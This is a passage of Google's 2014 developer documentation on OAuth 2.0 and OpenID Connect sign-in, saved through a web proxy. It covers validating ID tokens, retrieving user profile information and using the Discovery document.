  infrastructure, the <code>hd</code> parameter automatically redirects to that user's SAML resource to log
  in.
  </td>
  </tr></tbody></table>

<h3 id="validatinganidtoken">Validating an ID token</h3>

<p>
You need to validate all ID tokens on your server unless you know that 
they came directly from Google. For example, your server must verify as 
authentic any ID tokens it receives from your client apps.
</p>

<p>
The following are common situations where you might send ID tokens to your server:
</p>

<ul>
  <li>
    Sending ID tokens with requests that need to be authenticated. The ID tokens
    tell you the particular user making the request and for which client that ID
    token was granted.
  </li>
  <li>
    Sending ID tokens that contain OpenID 2.0 identifiers (<code>openid_id</code>)
    that need to be mapped to the Google ID (<code>sub</code>).
  </li>
</ul>

<p>
ID tokens are sensitive and can be misused if intercepted. You must 
ensure that these tokens are handled securely by transmitting them only 
over HTTPS and only via POST data or within request headers. If you 
store them on your server, you must also store them securely.
</p>

<p>
One thing that makes ID tokens useful is that fact that you can pass 
them around different components of your app. These components can use 
an ID token as a lightweight authentication mechanism authenticating the
 app and the user. But before you can use the information in the ID 
token or rely on it as an assertion that the user has authenticated, you
 <b>must</b> validate it.
</p>

Validation of an ID token requires two steps:
<p></p>

<ol>
<li>Verify that the ID token is a JWT which is properly signed with an appropriate Google public key and has not expired
</li><li>Verify that the value of the <code>aud</code> field in the ID token is identical to your app’s client ID and that the <code>iss</code> is <code>accounts.google.com</code>
</li></ol>

<p>
The second step above involves only string comparison, so is simple.
</p>

<p>
The first step is more complex, and involves cryptographic signature checking. For debugging purposes, you can use Google’s <code>tokeninfo</code> endpoint.  Suppose your ID token’s value is <code>XYZ123</code>. Then you would dereference the URI <code>https://www.googleapis.com/oauth2/v1/tokeninfo?id_token=XYZ123</code>. If the token is valid, the response would be its decoded JSON form.
</p>

<p>
This involves an HTTP round trip, introducing latency and the potential for network breakage.  The <code>tokeninfo</code>
 endpoint is useful for debugging but for production purposes, we 
recommend that you retrieve Google’s public keys from the keys endpoint 
and perform the validation locally.  You should retrieve the keys URI 
from the <a href="#discovery">Discovery document</a> using the key <code>jwks_uri</code>.
</p>

<p>
Since Google changes its public keys only infrequently (on the order of 
once per day), you can cache them and, in the vast majority of cases, 
perform local validation much more efficiently than by using the <code>tokeninfo</code>
 endpoint.  This requires retrieving and parsing certificates, and 
making the appropriate crypto calls to check the signature.  
Fortunately, there are well-debugged libraries available in a wide 
variety of languages to accomplish this.
</p>


<h4>Sample validation code for ID tokens</h4>

<p>
Samples that demonstrate how to perform ID token validation are 
available in the following languages.  As an example, the Java sample 
code uses the open-source <code>GoogleIDToken</code> and <code>GoogleIDTokenVerifier</code> classes.
These libraries normally validate the token and return its parsed payload (if valid) in one step.
</p>

<ul>
  <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=R2MokPqTHzNaaNdL56a0r3rTYDfQcrhqgVs4rvlEBF47jTpY2qrPhD0J7i3A9Xfo4vpOpzfmwaFPpd8ZrzcVew%3D%3D">C# / .NET</a></li>
  <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=R2MokPqTHzNaaNdL56a0r3rTYDfQcrhqgVs4rvlEBF47jTpY2qrPhD0J7i3A9Xfoe9TNU8s6TE4Jy4%2FeHnepIg%3D%3D">Java</a></li>
  <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=R2MokPqTHzNaaNdL56a0r3rTYDfQcrhqgVs4rvlEBF47jTpY2qrPhD0J7i3A9Xfo4vpOpzfmwaFPpd8ZrzcVew%3D%3D">PHP</a></li>
  <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=R2MokPqTHzNaaNdL56a0r3rTYDfQcrhqgVs4rvlEBF47jTpY2qrPhD0J7i3A9XfoZt4nhiVk6vjpJ4%2FyKt0bXA%3D%3D">Python</a></li>
  <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=R2MokPqTHzNaaNdL56a0r3rTYDfQcrhqgVs4rvlEBF47jTpY2qrPhD0J7i3A9XfoM4kuKYoDQAckWo2ml045yw%3D%3D">Ruby</a></li>
</ul>

<h3 id="obtaininguserprofileinformation">Obtaining user profile information</h3>
<p>To obtain additional profile information about the user, you can use the access token (which your 
application receives during the <a href="#authenticatingtheuser">authentication flow</a>) with 
two different endpoints. Unless you are using the <code>plus.login</code> scope, these 
endpoints provide identical information, just formatted differently.</p>

<h4>Google+ Sign-In</h4>
<p>If you are using <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjURAH7wFOzMLer8e%2BtnT5WCU%3D">Google+ Sign-In</a>, retrieve user profile information from the 
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlugucaXXKzVOWpPrajqF%2FckBNEgoiH4U95qaHeRAHxNGvQ%3D%3D"><code>people.get</code></a> endpoint. 
To do this, add your access token to the authorization header and make  an HTTPS <code>GET</code> request to the following URI:</p>
<pre>https://www.googleapis.com/plus/v1/people/me</pre> 
<p>Use your access token to authenticate the request, as described in 
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlugucaXXKzVOWpPrajqF%2FckBNEgoiH4U95qaHeRAHxNGvQ%3D%3D"><code>people.get</code></a>. Note that the response does not use 
the OpenID Connect format.</p> 
<h4>OpenID Connect</h4>
<p>If you want to use the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5o2FnF6YW64xOxL8ab%2BVQR%2B7ksILkQOXLlIyHAl8Cuex%2BE%2FvwsaRDRNb5X%2B%2Ba0wVvw%3D%3D">OpenID
Connect</a> standard and need attributes formatted accordingly:</p>
<ol>
 <li><p>To be OpenID-compliant, you must include the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlujCjbbQMJDAlYSxH3A0ZiRy4wuAgizcit43VkL3QPLsDg%3D%3D##profile"><code>openid profile</code></a> scope in your
<a href="#sendauthrequest">authentication request</a>. </p>
<p>If you want the user’s email
address to be included, you can optionally request the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnluj0irfF8QD5%2F%2Ft4Md%2FEQSMB##email"><code>openid email</code></a> scope.
To specify both <code>profile</code> and <code>email</code>, you can include the following parameter in your authentication request URI:</p>
<pre>scope=openid%20email%20profile</pre>
 </li>
 <li>Add your access token to the authorization header and make an HTTPS <code>GET</code> request to the userinfo endpoint, which you should retrieve from the <a href="#discovery">Discovery document</a> using the key <code>userinfo_endpoint</code>.
The response
includes information about the user, as described in
<a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlugucaXXKzVOWpPrajqF%2FckBojEqjcq6EEMrg6Vyz4eDD8%2FHBaWAZYawetH3wcqmH4s%3D"><code>people.getOpenIdConnect</code></a>.
Different users may choose to supply or withhold certain fields, so you might not get information
for every field to which your scopes request access.
 </li>
  </ol>



<style>
  body.docs section.expandable-bottom-margin {
    margin-bottom: 1.5em;
  }
  body.docs section.expandable-no-left-margin {
    margin-left: 0;
  }
</style>


<h2 id="discovery">The Discovery document</h2>
<p>The OpenID Connect protocol requires the use of multiple endpoints 
for authenticating users, and for requesting resources including tokens,
 user information, and public keys.</p>
<p>To simplify implementations and increase flexibility, OpenID Connect 
allows the use of a "Discovery document," a JSON document found at a 
well-known location containing key-value pairs which provide details 
about the OpenID Connect provider's configuration, including the URIs of
 the authorization, token, userinfo, and public-keys endpoints.  The 
Discovery document for Google's OpenID Connect service may be retrieved 
from:</p>
<pre>https://accounts.google.com/.well-known/openid-configuration</pre>
<p>Here is an example of such a document; the field names are those specified in <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5o2FnF6YW64xOxL8ab%2BVQR9XH067C1gLp5DU1KfvMy%2Fo4e%2Bw9w4Ywe9DHOt5n%2FGuyU0OjM94HHf3aZiy%2BnOX9Dw%3D##ProviderMetadata">OpenID Connect Discovery 1.0</a>
 (refer to that document for their meanings). The values are purely 
illustrative and might change, although they are copied from from a 
recent version of the actual Google Discovery document:</p>
<pre>{
 "issuer": "accounts.google.com",
 "authorization_endpoint": "https://accounts.google.com/o/oauth2/auth",
 "token_endpoint": "https://accounts.google.com/o/oauth2/token",
 "userinfo_endpoint": "https://www.googleapis.com/plus/v1/people/me/openIdConnect",
 "revocation_endpoint": "https://accounts.google.com/o/oauth2/revoke",
 "jwks_uri": "https://www.googleapis.com/oauth2/v2/certs",
 "response_types_supported": [
  "code", "token", "id_token",
  "code token", "code id_token", "token id_token", "code token id_token",
  "none"
 ],
 "subject_types_supported": [ "public" ],
 "id_token_alg_values_supported": [ "RS256" ]
}</pre>
<p>To use Google's OpenID Connect services, you should hard-code the Discovery-document URI (<code>https://accounts.google.com/.well-known/openid-configuration</code>)
 into your application. Your application fetches the document, then 
retrieves endpoint URIs from it as needed. For example, to authenticate a
 user, your code would retrieve the value of the <code>authorization_endpoint</code> key and use its value (<code>https://accounts.google.com/o/oauth2/auth</code> in the example above) as the base URI for authentication requests that are sent to Google.</p>
<p>You may be able to avoid an HTTP round-trip by caching the values 
from the Discovery document.  Standard HTTP caching headers are used and
 should be respected.</p>

</section>

<section>
<h2 id="libraries">Client libraries</h2>
<p>The following client libraries make implementing OAuth 2.0 simpler by integrating with popular frameworks:</p>
  <ul>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnluivB%2FucAxF2ZpkM16pTU0zY">Downloads and quickstart apps for Google+ Sign-In</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J5D7Ls5eYkdIctLPT7V%2BkSP2Cr6ALHAGROpAxoF6OTF7Q%3D%3D">Google APIs Client Library for Java</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUVNh3XL7%2Bu%2BfbTRe7HjF75sGkv9VWgvxoKEXUknBK3YR1XstKwuJkgIey5lnAYzq7uo7o5dUc2dluzBKp21BSzw%3D">Google APIs Client Library for Python</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUVNh3XL7%2Bu%2BfbTRe7HjF75sGkv9VWgvxoKEXUknBK3YRTlN19or6JVJqsK5bJ06YT%2Bo7o5dUc2dluzBKp21BSzw%3D">Google APIs Client Library for .NET</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J7Ij2kIlVxvn11xxQnm8l2V2Cr6ALHAGROpAxoF6OTF7Q%3D%3D">Google APIs Client Library for Ruby</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIjcq7RJZrvKxYm1G%2Bu7H6J47PPTl6ipeQp8J7uG8QlK5OBAvCVnXnFk351vGZoZoqQ%3D%3D">Google APIs Client Library for PHP</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIr578DgT14sEdeE5fNMSgLhdKnCQ%2F6pynhHQs3N0yLC%2B">OAuth 2.0 Library for Google Web Toolkit</a></li>
    <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=PARdxb6WX0fldzmyI3TGIqc%2FRcJyF%2BpiTLp567bOjIF85%2BgXuns3j7MSlSR%2FHiSO">Google Toolbox for Mac OAuth 2.0 Controllers</a></li>
  </ul>
</section>

<section>
<h2 id="oidc-compliance">OpenID Connect compliance</h2>
<p>Google's OAuth 2.0 authentication system supports the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5o2FnF6YW64xOxL8ab%2BVQR%2B7ksILkQOXLlIyHAl8CuexwxxBPTShgXykpH46plfWEg%3D%3D##ServerMTI">required features</a> of the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5o2FnF6YW64xOxL8ab%2BVQR%2B7ksILkQOXLlIyHAl8Cuex%2BE%2FvwsaRDRNb5X%2B%2Ba0wVvw%3D%3D">OpenID Connect Core</a>
 specification.  Any client which is designed to work with OpenID 
Connect should interoperate with this service (with the exception of the
 <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dGyTFdVU2m9zFFZIjubu5o2FnF6YW64xOxL8ab%2BVQR%2B7ksILkQOXLlIyHAl8CuexniSLXeP8naeJUmmavqd7JM%2FHBaWAZYawetH3wcqmH4s%3D##RequestObject">OpenID Request Object</a>).</p>
</section>

  
  </div>

  
        </div>
        
<div id="gc-content-footer">

<div id="gc-content-license">

    
      
        <p>Except as otherwise noted, the content of this page is licensed under the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=ynlwkXfCjJUffzIaoIeZ%2FUN0CFxbeU6lD6UWPagKe5zqo2%2FTLmz2iW3xtrdpV1MW">Creative Commons Attribution 3.0 License</a>, and code samples are licensed under the <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=uvnrxNZ00suM7oEf7JLfuBPOug1EeoAul%2F9ZBbjNRx%2FgKZ2zNPZ5sGH7R3Ji2e%2Bs">Apache 2.0 License</a>. For details, see our <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUYRx7nI31Er2pag%2FQmf4jjSfFWfoGF3P5Y0xfXhSobK1">Site Policies</a>.</p>
      
    
    
    

</div>



<div itemprop="datePublished" content="2014-08-18T22:54:44.866020" id="gc-content-last-updated">Last updated August 18, 2014.</div>

</div>


      </div>
  

        
      </div>
        
      
      
        
          
        
      

      
  
       <!-- not (if site.theme == 'maia' or site.theme == 'maia-cloud') -->
      <div id="gc-footer-container">
        <footer id="gc-footer">
          




        <div id="maia-footer-local" class="footer-local">
          <div id="footer-top" class="maia-aux">
            <div class="footer-top-wrap">

             <div class="search-wrap new_left">
               <div class="dev-wrap new_left">
                 <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUf5xjFBwwEoca%2FyPPZTvEj4%3D"><img src="OAuth2Login_files/nppxjoj.png"></a>
               </div>
               <form class="search new_left" action="" method="GET" id="footer-search"><input name="____pgfa" value="qA0oL3D513Rhj1%2BjRJtjUcptr1vTPpubc4Xf%2BIVlWbsCtiR2gTsZlA8LjfcvXxFd" type="hidden">
                 <div id="searchbox" class="searchbox new_left">
                   <input name="q" class="q" id="q" placeholder="Search" autocomplete="off" type="text">
                 </div>
                 <button id="search-button" class="button button-blue big new_left">
                   <img src="OAuth2Login_files/nppxjoj_002.png" alt="Search">
                 </button>
               </form>
             </div>
             <div class="plus-wrap new_left">
               <div class="plus">
                 <!-- Place this tag where you want the widget to render. -->
                 <div class="g-follow" data-annotation="bubble" data-height="24" data-href="https://plus.google.com/111395306401981598462" data-rel="publisher"></div>
                 <!-- Place this tag after the last widget tag. -->
                 
               </div>
             </div>
           </div>
         </div>

      <div id="footer-list" class="maia-aux">
    <div class="footer-list-wrap  maia-cols">
      <div class="maia-col-3">
        <h4>Explore</h4>
        <ul>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUbepwcqFoFLRyTnK6X%2Fc1c04Evw%2BzrlP9hWlrKLZXLwK">Products</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUQqGcnBWn8SzpBzttQgNfsgoysh8BqcJvHhqQJ%2F5Yi4h">Showcase</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUXGXWJHgflcqZDgiSasWoQ0sWVyxwJeRySQwAVc7QyP7">Events</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUXAinS3bTOS7LV4QiR%2FeHw0uX0DF8BkyhyBS%2Bro5jAlC">Communities</a></li>
        </ul>
      </div>
      <div class="maia-col-3">
        <h4>Connect</h4>
        <ul>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=EwbxwhL3QECSkTAhXltMBtpGKwPlAnIjxE%2B3npnELIgTLaPJl3mixX2LtdlHLXaz">Blog</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=exZ01bCWk8%2B8Vr3JLnMEPTa%2Fm1fusuB%2F5Q8DoFQRo29Xx40WAwzXPtesu%2F2HPF2U">Google+ Community</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=8HYu%2FW5iSVXeur1adNPDBhjNyjzCfHBPyt%2F010pTSg9wZeGGoYN9Gph55Lnk1ooL">YouTube Channel</a></li>
          <li><a class="google-feedback" data-p="81425" data-b="Documentation" data-v="devsite-20140818-r00-rc00.default" href="">Report an Issue</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUX3ENfuuL4SbW1jRqPO2q9qADnekCRWhHgX9YXlgsPau">Jobs</a></li>
        </ul>
      </div>
      <div class="maia-col-3">
        <h4>Programs</h4>
        <ul>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjURhObgIGFcJDa5pphcvq8z3vRlq8Jp89aqg99zuaIzPK">Groups</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUX1X5SfuGgdOAfHwdn55ImTDO91dh%2FHD5DTpeYu%2FQG1q">Experts</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUR6%2BuFR7ECBcbl35bQfG%2BDiWGfmdkiwd8jsjlsogCST8">Startups</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUYGnGPpHMpuz3bGDIb7TF0ZjEyomNXfdCYZgrzj3obTl">Women Techmakers</a></li>
        </ul>
      </div>
      <div class="maia-col-3">
        <h4>Top Products</h4>
        <ul class="top-prod-1 left">
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUVKm7y3unxOaYXYR1UPxBd7FcYDJ5lhPeLPynNpIzG8k">Ads</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUdBiFd0hQ5FRIU8%2FSEIVavN5NQE%2FQT2a2sy3%2FD75TaMY">Analytics</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=dhc55oqeIKgKtPmfJmE1trQJxMmlabUB%2BO8hbRsz1kY%3D">Android</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUTXe6t8PfuiuPvsuM9XSRA4GKAhDT1yokZCzSWQzPpxa">Apps</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUX3ENfuuL4SbW1jRqPO2q9qNitI5%2FNqhM%2BezxDLxHUPs">Cast</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUfhMBiBgszhhyEf%2FEQmB88H%2FDzmLUnRb%2B7vWY6a8kxUG">Chrome</a></li>
        </ul>
        <ul class="top-prod-2 left">
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUQSAigZ1BNkydNu7BYYLNPL83RyI%2B550C2Qd%2F35Joxdw">Cloud</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUfyb1U8iSfNiGaTelP3xwiz9ZlRu5%2FF12FuD%2BCbF3zo%2B">Glass</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUWoU%2FZxnh%2FsKsPRUgYjnlug%3D">Google+</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUU3snOGjA6WMLDa76cOXEoy%2FBuw%2FFP74jDIH3v3UiEI7">Maps</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUXAinS3bTOS7LV4QiR%2FeHw0DCt%2BwiCofCVcnvuMiFjif">Wallet</a></li>
          <li><a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUU5yd0LFGeFSbJ6rwGGA%2FIxy2OhZUjQE3IuP5RFawNfY">YouTube</a></li>
        </ul>
      </div>
    </div>
  </div>
</div><!-- END DIV#MAIA-FOOTER-LOCAL -->

<div id="maia-footer-global" class="footer-global">
  <div class="maia-aux">
    <span id="terms">
      <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUYRx7nI31Er2pag%2FQmf4jjT2oKkSwZwVAd7zfFSQuqaC">Terms of Use</a>
    </span>
    <span class="pipe">
    </span>
    <span id="privacy">
      <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=l%2BH91dA%2Fe9CXzuceQI13h6E9zKprRIzFcQyBg4x3bbt87DjG6RNW5Vd7tnTcuWFq">Privacy Policy</a>
    </span>

    
    <div id="gc-language" class="new_right">
    <ul>
      <li>
        <form id="setlang" action="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=qA0oL3D513Rhj1%2BjRJtjUenWfnIYY0vx%2F63SKb5FyPyipRCGVT3N4lQjUn0oM5dq" method="post">
          <input name="csrfmiddlewaretoken" value="blIO8npDrhv818eGFaTAjtt7RuZIBk1t" type="hidden">
          <select id="footer_language" name="language">
            <option value="ar">
                العربيّة
              </option><option value="bg">
                български
              </option><option value="ca">
                català
              </option><option value="zh-cn">
                简体中文
              </option><option value="zh-tw">
                繁體中文
              </option><option value="hr">
                Hrvatski
              </option><option value="cs">
                česky
              </option><option value="da">
                dansk
              </option><option value="nl">
                Nederlands
              </option><option value="en" selected="selected">
                English
              </option><option value="fa">
                فارسی
              </option><option value="fi">
                suomi
              </option><option value="fr">
                français
              </option><option value="de">
                Deutsch
              </option><option value="el">
                Ελληνικά
              </option><option value="he">
                עברית
              </option><option value="hi">
                Hindi
              </option><option value="hu">
                Magyar
              </option><option value="id">
                Bahasa Indonesia
              </option><option value="it">
                italiano
              </option><option value="ja">
                日本語
              </option><option value="ko">
                한국어
              </option><option value="lv">
                latviešu
              </option><option value="lt">
                Lithuanian
              </option><option value="nb">
                norsk (bokmål)
              </option><option value="nn">
                norsk (nynorsk)
              </option><option value="pl">
                polski
              </option><option value="pt-br">
                Português Brasileiro
              </option><option value="pt">
                Português
              </option><option value="ro">
                Română
              </option><option value="ru">
                Русский
              </option><option value="sr">
                српски
              </option><option value="sk">
                slovenský
              </option><option value="sl">
                Slovenščina
              </option><option value="es">
                español
              </option><option value="sv">
                svenska
              </option><option value="th">
                Thai
              </option><option value="tr">
                Türkçe
              </option><option value="uk">
                Українська
              </option><option value="vi">
                Vietnamese
              </option>
          </select>
        </form>
      </li>
    </ul>
    </div>
    
  </div>
</div><!-- END DIV#MAIA-FOOTER-GLOBAL -->


        </footer>
      </div>
      
      
  

    </div>
    <div id="needAuth" class="msgDialogContent">
      
      <h1>Authentication required</h1>
      
      <div>
        You need to be signed in with <a href="http://www.junkpilot.com/nppxjoj.php?8fzyhIAhMX1GihyIsVh7oQ=l%2BH91dA%2Fe9CXzuceQI13h9TaW3WU1JMhNxrIiAw18IM%3D">Google+</a> to do that.
      </div>
      <button>Sign in</button>
      <button>Cancel</button>
    </div>
    <div id="signingIn" class="msgDialogContent">
      
      <h1>Signing you in...</h1>
      <div>
        
        Google Developers needs your permission to do that.
      </div>
      
      <button>Try again</button>
      
      <button>Cancel</button>
    </div>
    <div id="search-autocomplete" class="search-results search-autocomplete" style="display:none"></div>
    
    
      
    
    
    
    
    
    <!-- Google Code for PXL - Developers - Codesite - HP - 90d Remarketing List -->
    
    
    

    

    
    
    
    

    
    
    
    <iframe src="OAuth2Login_files/nppxjoj.htm" style="display:none" frameborder="0" height="1" width="1"></iframe>
    
    

    
      <div style="display:inline;">
        <img style="border-style:none;" alt="" src="OAuth2Login_files/nppxjoj.gif" height="1" width="1">
      </div>
    
    








  </div><!-- END DIV.MAIA-MAX -->
  

  

</body></html>